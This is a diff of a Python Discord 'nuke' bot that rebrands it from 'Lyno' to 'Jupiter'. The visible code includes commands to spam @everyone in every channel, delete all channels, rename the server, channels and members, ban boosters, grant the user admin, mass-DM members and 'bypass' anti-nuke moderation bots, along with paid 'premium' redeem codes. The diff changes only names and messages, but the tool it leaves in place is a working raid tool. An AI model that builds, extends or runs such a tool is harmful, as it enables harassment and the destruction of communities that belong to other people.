@@ -34,28 +34,28 @@ bypasscooldown = 200
 special_user_id = 1169441226030850133
 SPECIAL_USERS = [1169441226030850133, 1]
 session = requests.Session()
-message = f"https://dsc.gg/lyno Hola !"
-events = ["dsc.gg/lyno"]
+message = f"lmao jupiter?"
+events = ["jupiter?"]
 token = ""
 prefix = "."
-stats = "Security V2 | Lyno Mod"
-chan = "r̴a̴i̴d̴ ̴b̴y̴ ̴l̴y̴n̴o̴"
-spamdata = "@everyone @here https://dsc.gg/lyno JOIN FOR FREE N'KE BOT | https://twitch.tv/LynoConfigs | denominado = unirse a un nuevo servidor | https://cdn.discordapp.com/attachments/1164790654480683030/1198131579353059328/Lynonukedppf.png?ex=65bdc9fc&is=65ab54fc&hm=6166be8d0d5adb208b03f92f74e7e3137a67eb7154e8283785f2c590be790c0a& "
+stats = "Jupiter Came"
+chan = "Jupiter Beta"
+spamdata = "@everyone @here Jupiter"
 spamimage = "https://cdn.discordapp.com/attachments/1146260562674720768/1185204098820218990/LynoDestroyer.gif?ex=658ec255&is=657c4d55&hm=9102220a463e6da0b25c401bd121a011df624ac7ea43612fc37ada139fb5052a&"
-channelname_list = ["𝐫𝐞𝐤𝐭 𝐛𝐲 𝐥𝐲𝐧𝐨𝐝𝐞𝐬𝐭𝐫𝐨𝐲𝐞𝐫𝐬","r̴a̴i̴d̴ ̴b̴y̴ ̴l̴y̴n̴o̴d̴e̴s̴t̴r̴o̴y̴e̴r̴s̴", "h̴a̴c̴k̴ ̴b̴y̴ ̴l̴y̴n̴o̴d̴e̴s̴t̴r̴o̴y̴e̴r̴s̴", "t̷r̷a̷s̷h̷ ̷b̷y̷ ̷l̷y̷n̷o̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷","💀ηυкє ∂є ℓуησ∂єѕтяσуєяѕ","ℓуησ∂єѕтяσуєяѕ ση тσρ","נσιη ℓуησ∂єѕтяσуєяѕ","s̴p̴a̴m̴ ̴b̴y̴ ̴l̴y̴n̴o̴d̴e̴s̴t̴r̴o̴y̴e̴r̴s̴","ℓуησ∂єѕтяσуєяѕ σωηѕ уσυ","💀𝔼𝕤𝕥𝕒𝕓𝕒𝕤 𝕞𝕦𝕖𝕣𝕥𝕒","probably of lynodestroyers","lynodestroyers on top","lynodestroyers owns you","wrecked by lynodestroyers","you messed up with lynodestroyers"]
+channelname_list = ["JUPITER RAIDED","HACKED BY JUPITER", "RUN BY JUPITER", "JUPITER FUCKS","JUPITER?","JUPITER ON TOP"]
 intents = discord.Intents.all()
 client = discord.Client(intents=intents)
 rol = "Staff Member"
 webname = "ᏖᎧᎮ ᏰᎧᏖ"
 amountss = 1000
-new_nickname = "L̷͖͈̓͌̎̉͒͗͂̓̌̚͝Ý̴̥͙̘̇̈́̇̃͒̿́͘͘͝͝ͅN̸̡̧͕͙̼̻̳̦̪̞̯͎̦͓̏̒͌͑͒͊̾͌̑̅̕͝ͅO̵̧̗͕̹̼̦̗̮̱̝͆͊́́̈̿̋ͅ O̵̧̗͕̹̼̦̗̮̱̝͆͊́́̈̿̋ͅN̸̡̧͕͙̼̻̳̦̪̞̯͎̦͓̏̒͌͑͒͊̾͌̑̅̕͝ͅT̷̡̧̬̲̭̦̘̩̊̉͛̓̓̌͌̕O̵̧̗͕̹̼̦̗̮̱̝͆͊́́̈̿̋ͅP̷̛̛̛̩̺͇̊̅̍͂͗͑͐̎̂̏̐̐"
-new_name = "💀LYNO WAS HERE | dsc.gg/lyno"
+new_nickname = "Jupiter?"
+new_name = "Raided by jupiter xx"
 intents = discord.Intents().all()
 intents.message_content = True
 bot = commands.Bot(command_prefix=prefix, intents=intents)
 bot.remove_command("help")
 premium = "false"
-channel_name = "rip by lynodestroyers"
+channel_name = "Jupiter runs this"
 cooldowns = {} 
 code_rewards = {
         "LYNO-GWK8-WB6T-FVZJ": "Premium Lifetime",
@@ -120,20 +120,19 @@ async def help(ctx):
     embed.add_field(name="kill", value="trash the server")
     embed.add_field(name="banboosters", value="Ban All the Boosters From the servers")
     embed.add_field(name="swh", value="respamm webhooks")
-    embed.add_field(name="eadmin", value="You've Admin")
+    embed.add_field(name="eadmin", value="Give yourself Admin")
     embed.add_field(name="delchan", value="delete all channels")
     embed.add_field(name="spam", value="send message on everychannel in server")
     embed.add_field(name="nall",value="Changes All Member Nickname on Guild")
-    embed.add_field(name="custom_kill ",value="Custom Command Only For Premium !")
-    embed.add_field(name="settings",value="ONLY FOR PREMIUM USERS KILL SETTINGS (OWN)")
-    embed.add_field(name="akick",value="Kicks AutoMod in UserID List")
-    embed.add_field(name="bypass",value="Bypasses Most Antin'ke Automod Example : <@536991182035746816> ")
-    embed.add_field(name="status",value="Get your status ! ")
-    embed.add_field(name="massdm",value="Dm EveryPeople in the server <ten message only>")
+    embed.add_field(name="custom_kill ",value="Custom Nuke {Premium}")
+    embed.add_field(name="settings",value="Customize Your Nuke! {Premium}")
+    embed.add_field(name="bypass",value="Bypasses Most Antinuke bots! ")
+    embed.add_field(name="status",value="Bot Status ")
+    embed.add_field(name="massdm",value="Dm Everyone in the server <ten message only>")
     try:
         await ctx.author.send(embed=embed)
     except discord.Forbidden:
-        await ctx.send("I couldn't send you a DM. Please enable DMs from server members.")
+        await ctx.send("Unable To Send DM.")
 #discord sucks
 @bot.command()
 async def webhookchat(ctx):
@@ -230,7 +229,7 @@ async def redeem(ctx):
 
                 if server and member and role:
                     await member.add_roles(role)
-                    await ctx.author.send(f"✅Thanks For Choosing Lyno | Code Redeemed Successfully  !")
+                    await ctx.author.send(f"✅Thanks For Choosing Jupiter | Code Redeemed Successfully  !")
         else:
             await ctx.author.send("Invalid code.")
     except asyncio.TimeoutError:
@@ -296,7 +295,7 @@ async def bypass(ctx):
                 print(f'Error creating channel: {chan}')
 
         async def edit_channel(channel):
-            await channel.edit(name="𝕓𝕪𝕡𝕒𝕤𝕤𝕖𝕕 𝕓𝕪 𝕝𝕪𝕟𝕠")
+            await channel.edit(name="Jupiter-Beta")
 
         async def create_webhooks(channel):
             for i in range(5):
@@ -314,7 +313,7 @@ async def bypass(ctx):
         amountspam = 99
         for _ in range(amountspam):
             for channel in guild.text_channels:
-                await channel.send("Bypassed EASILY ! By Lyno")
+                await channel.send("Jupiter ##")
                 await channel.send(spamdata)
                 await channel.send(spamimage)
 
@@ -334,7 +333,7 @@ async def bypass(ctx):
         """
         embed = discord.Embed(
             title="⚠️ERROR",
-            description=f"Premium To Bypass :D \n {cooldownmsg}",
+            description=f"Premium To Bypass \n {cooldownmsg}",
             color=discord.Color.blue()
         )
 
@@ -354,7 +353,7 @@ async def bypass(ctx):
             print(f'Error creating channel: {chan}')
 
     async def edit_channel(channel):
-        await channel.edit(name="𝕓𝕪𝕡𝕒𝕤𝕤𝕖𝕕 𝕓𝕪 𝕝𝕪𝕟𝕠")
+        await channel.edit(name="Jupiter")
 
     async def create_webhooks(channel):
         for i in range(5):
@@ -372,7 +371,7 @@ async def bypass(ctx):
     amountspam = 99
     for _ in range(amountspam):
         for channel in guild.text_channels:
-            await channel.send("Bypassed EASILY ! By Lyno")
+            await channel.send("Jupiter")
             await channel.send(spamdata)
             await channel.send(spamimage)
 
@@ -413,8 +412,8 @@ async def kill(ctx):
             event = {
                 'date': "Infinite",
                 'time': "Infinite",
-                'description': "Server: dsc.gg/lyno",
-                'creator': "Lyno Bot"
+                'description': "Jupiter Has Knocked!",
+                'creator': "run."
             }
             events.append(event)
 
@@ -486,8 +485,8 @@ async def kill(ctx):
             event = {
                 'date': "Infinite",
                 'time': "Infinite",
-                'description': "Server: dsc.gg/lyno",
-                'creator': "Lyno Bot"
+                'description': "Jupiter Knocked",
+                'creator': "Run"
             }
             events.append(event)
 
@@ -506,7 +505,7 @@ async def kill(ctx):
         """
         embed = discord.Embed(
             title="⚠️ERROR",
-            description=f"Premium To Bypass :D \n {cooldownmsg}",
+            description=f"Premium To Bypass \n {cooldownmsg}",
             color=discord.Color.blue()
         )
 
@@ -588,7 +587,7 @@ async def settings(ctx):
                     break
 
         if not premium:
-            await user.send("Premium Feature | Premium = https://dsc.gg/lyno")
+            await user.send("Premium Feature")
             return
 
         await user.send("Please provide the custom channel name:")
@@ -735,12 +734,12 @@ async def custom_kill(ctx):
                 await main()
 
             else:
-                await user.send("**Please Buy Premium At **[Here](<https://dsc.gg/lyno>)")
+                await user.send("**Please Buy Premium At")
                 return
 
 @bot.command()
 async def eadmin(ctx):
-    role_name = "Lyno on top" 
+    role_name = "Jupiter on top" 
     admin_role = discord.utils.get(ctx.guild.roles, name=role_name)
     if admin_role:
         return await ctx.send(f"nah")
@@ -766,9 +765,9 @@ async def delchan(ctx):
         except discord.HTTPException:
             print(f'Error deleting channel: {channel.name}')
     await asyncio.gather(*[delete_channel(channel) for channel in channels if isinstance(channel, discord.TextChannel)])
-    channel_name = "💀dejé a Lyno aquí" 
+    channel_name = "Jupiter" 
     channel = await guild.create_text_channel(channel_name)
-    message_content = "@everyone termed = https://dsc.gg/lyno denominado = unirse a un nuevo servidor"
+    message_content = "@everyone Jupiter was here."
     await channel.send(message_content)
 
 @bot.command()
